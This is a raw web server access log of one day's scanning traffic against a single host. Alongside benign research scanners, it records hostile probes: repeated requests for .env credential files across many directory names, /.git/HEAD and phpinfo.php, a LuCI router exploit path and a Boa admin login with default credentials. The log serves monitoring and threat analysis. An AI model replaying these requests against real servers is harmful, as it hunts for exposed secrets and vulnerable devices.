95.214.55.226 - - [16/Jan/2025:04:44:29 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
148.153.45.238 - - [16/Jan/2025:05:52:45 +0000] "GET /QOKq HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [16/Jan/2025:05:52:45 +0000] "GET / HTTP/1.1" 200 966 "http://34.155.227.229:80/QOKq" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [16/Jan/2025:05:52:46 +0000] "GET /W4fl HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [16/Jan/2025:05:52:46 +0000] "GET / HTTP/1.1" 200 966 "http://34.155.227.229:80/W4fl" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [16/Jan/2025:05:52:47 +0000] "GET /aab8 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [16/Jan/2025:05:52:47 +0000] "GET / HTTP/1.1" 200 966 "http://34.155.227.229:80/aab8" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [16/Jan/2025:05:52:47 +0000] "GET /aab9 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [16/Jan/2025:05:52:47 +0000] "GET / HTTP/1.1" 200 966 "http://34.155.227.229:80/aab9" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
205.210.31.159 - - [16/Jan/2025:06:18:10 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
206.189.53.107 - - [16/Jan/2025:06:47:21 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible)"
206.189.53.107 - - [16/Jan/2025:06:47:21 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "http://34.155.227.229/" "Mozilla/5.0 (compatible)"
58.146.242.55 - - [16/Jan/2025:07:17:03 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
95.214.55.226 - - [16/Jan/2025:07:20:33 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
1.176.194.248 - - [16/Jan/2025:07:30:42 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.93 - - [16/Jan/2025:07:35:58 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [16/Jan/2025:07:35:58 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
195.178.110.224 - - [16/Jan/2025:07:44:15 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
5.181.190.248 - - [16/Jan/2025:07:45:14 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [16/Jan/2025:07:45:14 +0000] "GET / HTTP/1.1" 200 1742 "http://34.155.227.229:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
46.19.138.234 - - [16/Jan/2025:08:24:15 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.93 - - [16/Jan/2025:08:36:58 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [16/Jan/2025:08:36:58 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
178.215.236.132 - - [16/Jan/2025:09:09:57 +0000] "GET /.git/HEAD HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:55.0) Gecko/20100101 Firefox/55.0"
179.43.191.146 - - [16/Jan/2025:09:36:46 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
5.181.190.248 - - [16/Jan/2025:09:55:40 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [16/Jan/2025:09:55:40 +0000] "GET / HTTP/1.1" 200 1742 "http://34.155.227.229:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
110.41.184.245 - - [16/Jan/2025:10:11:47 +0000] "GET /stalker_portal/c/xpcom.common.js HTTP/1.1\n" 400 524 "-" "-"
167.99.67.123 - - [16/Jan/2025:10:32:55 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.99.67.123 - - [16/Jan/2025:10:33:13 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
95.214.55.226 - - [16/Jan/2025:10:49:24 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.93 - - [16/Jan/2025:11:02:15 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [16/Jan/2025:11:02:15 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
45.84.143.10 - - [16/Jan/2025:11:03:06 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
154.194.50.221 - - [16/Jan/2025:11:18:45 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"
154.194.50.221 - - [16/Jan/2025:11:18:55 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"
154.194.50.221 - - [16/Jan/2025:11:19:02 +0000] "GET /js/brand.js HTTP/1.1" 200 514 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0"
154.194.50.221 - - [16/Jan/2025:11:21:23 +0000] "GET /js/login.js HTTP/1.1" 200 866 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"
221.164.164.82 - - [16/Jan/2025:11:29:52 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
185.196.220.253 - - [16/Jan/2025:12:15:07 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
80.82.77.202 - - [16/Jan/2025:12:22:48 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre"
51.81.111.9 - - [16/Jan/2025:12:39:17 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
147.135.23.96 - - [16/Jan/2025:12:46:06 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
162.142.125.123 - - [16/Jan/2025:13:03:21 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
162.142.125.123 - - [16/Jan/2025:13:03:30 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.123 - - [16/Jan/2025:13:03:30 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.123 - - [16/Jan/2025:13:03:31 +0000] "GET / HTTP/1.1" 200 966 "http://34.155.227.229/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.123 - - [16/Jan/2025:13:03:31 +0000] "PRI * HTTP/2.0" 400 524 "-" "-"
78.153.140.93 - - [16/Jan/2025:13:06:00 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [16/Jan/2025:13:06:00 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
51.178.236.248 - - [16/Jan/2025:13:14:23 +0000] "\x16\x03\x03\x01\xa7\x01" 400 524 "-" "-"
51.178.236.251 - - [16/Jan/2025:13:14:27 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
139.59.101.104 - - [16/Jan/2025:13:17:13 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
137.74.239.152 - - [16/Jan/2025:13:21:08 +0000] "\x16\x03\x03\x01\xa7\x01" 400 524 "-" "-"
137.74.239.145 - - [16/Jan/2025:13:21:09 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
34.77.127.183 - - [16/Jan/2025:13:38:21 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
167.94.146.53 - - [16/Jan/2025:13:56:10 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
167.94.146.53 - - [16/Jan/2025:13:56:13 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.53 - - [16/Jan/2025:13:56:13 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.53 - - [16/Jan/2025:13:56:13 +0000] "GET / HTTP/1.1" 200 966 "http://34.155.227.229/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.53 - - [16/Jan/2025:13:56:13 +0000] "PRI * HTTP/2.0" 400 524 "-" "-"
46.19.138.234 - - [16/Jan/2025:14:15:58 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
137.220.126.100 - - [16/Jan/2025:14:19:17 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
170.62.100.40 - - [16/Jan/2025:14:35:15 +0000] "GET / HTTP/1.1" 200 947 "-" "WanScannerBot/1.0"
170.62.100.40 - - [16/Jan/2025:14:35:17 +0000] "\x16\x03\x01" 400 524 "-" "-"
58.141.235.235 - - [16/Jan/2025:14:45:10 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
203.177.28.155 - - [16/Jan/2025:14:50:25 +0000] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 302 350 "-" "-"
184.105.247.254 - - [16/Jan/2025:15:10:44 +0000] "\x16\x03\x01" 400 524 "-" "-"
78.153.140.93 - - [16/Jan/2025:15:21:41 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [16/Jan/2025:15:21:42 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
174.80.216.194 - - [16/Jan/2025:15:54:54 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
64.62.156.81 - - [16/Jan/2025:15:56:03 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36"
64.62.156.84 - - [16/Jan/2025:15:58:00 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0"
64.62.156.87 - - [16/Jan/2025:15:58:31 +0000] "GET /geoserver/web/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36"
45.148.10.242 - - [16/Jan/2025:16:01:40 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
20.118.69.86 - - [16/Jan/2025:16:13:06 +0000] "GET /manager/text/list HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
31.13.224.222 - - [16/Jan/2025:16:26:28 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
179.43.191.146 - - [16/Jan/2025:16:43:54 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
203.232.40.136 - - [16/Jan/2025:17:01:57 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
203.232.40.136 - - [16/Jan/2025:17:01:58 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
203.232.40.136 - - [16/Jan/2025:17:02:27 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
90.182.45.242 - - [16/Jan/2025:17:09:20 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
119.203.107.31 - - [16/Jan/2025:17:29:44 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
13.64.59.165 - - [16/Jan/2025:17:46:47 +0000] "MGLNDD_34.155.227.229_80\n" 400 524 "-" "-"
13.64.193.54 - - [16/Jan/2025:17:47:44 +0000] "GET /hudson HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
95.214.55.226 - - [16/Jan/2025:17:59:26 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
138.68.71.68 - - [16/Jan/2025:18:10:36 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0"
78.153.140.93 - - [16/Jan/2025:18:41:26 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [16/Jan/2025:18:41:27 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
3.21.134.81 - - [16/Jan/2025:19:02:13 +0000] "\x16\x03\x01" 400 524 "-" "-"
3.21.134.81 - - [16/Jan/2025:19:02:30 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
195.3.223.40 - - [16/Jan/2025:19:03:11 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.93 - - [16/Jan/2025:19:15:54 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [16/Jan/2025:19:15:54 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
192.155.90.118 - - [16/Jan/2025:19:51:29 +0000] "\x16\x03\x01" 400 524 "-" "-"
45.148.10.242 - - [16/Jan/2025:19:52:55 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
87.236.176.177 - - [16/Jan/2025:20:12:25 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
4.151.38.102 - - [16/Jan/2025:20:20:01 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
198.235.24.18 - - [16/Jan/2025:20:21:18 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
95.214.55.226 - - [16/Jan/2025:20:57:46 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
185.196.220.253 - - [16/Jan/2025:21:08:29 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
179.43.191.146 - - [16/Jan/2025:21:15:39 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.93 - - [16/Jan/2025:21:17:17 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [16/Jan/2025:21:17:17 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
46.19.138.234 - - [16/Jan/2025:21:18:08 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.19.138.234 - - [16/Jan/2025:22:17:00 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.242.226.10 - - [16/Jan/2025:22:43:00 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
78.153.140.203 - - [16/Jan/2025:22:51:25 +0000] "\x16\x03\x01" 400 524 "-" "-"
78.153.140.203 - - [16/Jan/2025:22:51:25 +0000] "GET /.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20110814 Firefox/10.0.1"
78.153.140.93 - - [16/Jan/2025:22:51:26 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [16/Jan/2025:22:51:26 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.203 - - [16/Jan/2025:22:51:26 +0000] "GET /Demo/.env HTTP/1.1" 302 331 "-" "Opera/8.51 (Windows 98; U; en)"
78.153.140.203 - - [16/Jan/2025:22:51:26 +0000] "GET /DEMO/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.5) Gecko/20070718 Fedora/2.0.0.5-1.fc7 Firefox/2.0.0.5"
78.153.140.203 - - [16/Jan/2025:22:51:28 +0000] "GET /Dev/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-us) AppleWebKit/531.9 (KHTML, like Gecko) Version/4.0.3 Safari/531.9 FBSMTWB"
78.153.140.203 - - [16/Jan/2025:22:51:29 +0000] "GET /DEV/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.206.0 Safari/532.0"
78.153.140.203 - - [16/Jan/2025:22:51:30 +0000] "GET /Doc/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36 OPR/37.0.2178.32"
78.153.140.203 - - [16/Jan/2025:22:52:50 +0000] "GET /DOC/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/125.2 (KHTML, like Gecko) Safari/125.8"
78.153.140.203 - - [16/Jan/2025:22:53:18 +0000] "GET /Docs/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; U; Linux x86_64; ja; rv:1.9.1.4) Gecko/20091016 SUSE/3.5.4-1.1.2 Firefox/3.5.4"
78.153.140.203 - - [16/Jan/2025:22:54:10 +0000] "GET /DOCS/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20130401 Firefox/31.0"
78.153.140.203 - - [16/Jan/2025:22:54:46 +0000] "GET /Download/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36"
78.153.140.203 - - [16/Jan/2025:22:55:06 +0000] "GET /Env/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; en) AppleWebKit/525.3+ (KHTML, like Gecko) Version/3.0.4 Safari/523.12.2"
78.153.140.203 - - [16/Jan/2025:22:55:18 +0000] "GET /Html/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; Linux i686; U) Opera 7.50  [en]"
78.153.140.203 - - [16/Jan/2025:22:56:20 +0000] "GET /Inc/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
78.153.140.203 - - [16/Jan/2025:22:56:53 +0000] "GET /Infos/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2"
78.153.140.203 - - [16/Jan/2025:22:57:15 +0000] "GET /Lib/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.1.10) Gecko/20100504 Firefox/3.5.10 GTB7.0 ( .NET CLR 3.5.30729)"
78.153.140.203 - - [16/Jan/2025:22:57:25 +0000] "GET /Library/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MALNJS; rv:11.0) like Gecko"
78.153.140.203 - - [16/Jan/2025:22:58:48 +0000] "GET /Logging/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36 OPR/33.0.1990.43"
78.153.140.203 - - [16/Jan/2025:22:59:08 +0000] "GET /Media/.env HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0; .NET4.0C; .NET4.0E)"
78.153.140.203 - - [16/Jan/2025:22:59:18 +0000] "GET /Misc/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Android 6.0.1; Tablet; rv:57.0) Gecko/57.0 Firefox/57.0"
78.153.140.203 - - [16/Jan/2025:22:59:31 +0000] "GET /New/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 7.1.1; SM-N950U Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36"
78.153.140.203 - - [16/Jan/2025:22:59:53 +0000] "GET /Phpinfo.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
78.153.140.203 - - [16/Jan/2025:23:00:05 +0000] "GET /PHPinfo.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:51.0) Gecko/20100101 Firefox/51.0"
78.153.140.203 - - [16/Jan/2025:23:00:24 +0000] "GET /PHPINFO.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; U; Android 4.3; en-us; MT2L03 Build/HuaweiMT2L03) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
78.153.140.203 - - [16/Jan/2025:23:01:01 +0000] "GET /Production/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 8.0.0; SM-G950U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36"
78.153.140.203 - - [16/Jan/2025:23:01:09 +0000] "GET /Public/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; U; Android 1.5; de-de; HTC Magic Build/PLAT-RC33) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1 FirePHP/0.3"
78.153.140.203 - - [16/Jan/2025:23:01:17 +0000] "GET /Server/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 6.0; XT1706 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36"
78.153.140.203 - - [16/Jan/2025:23:01:28 +0000] "GET /Shared/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.3 Safari/532.1"
78.153.140.203 - - [16/Jan/2025:23:01:32 +0000] "GET /Site/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MATBJS; rv:11.0) like Gecko"
78.153.140.203 - - [16/Jan/2025:23:01:50 +0000] "GET /Stage/.env HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.40607)"
78.153.140.203 - - [16/Jan/2025:23:01:54 +0000] "GET /Staging/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/ 20120405 Firefox/14.0.1"
78.153.140.203 - - [16/Jan/2025:23:02:13 +0000] "GET /Upload/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Android 6.0.1; Tablet; rv:51.0) Gecko/51.0 Firefox/51.0"
78.153.140.203 - - [16/Jan/2025:23:02:34 +0000] "GET /Vendor/.env HTTP/1.1" 302 331 "-" "Opera/9.80 (Windows NT 5.1) Presto/2.12.388 Version/12.10"
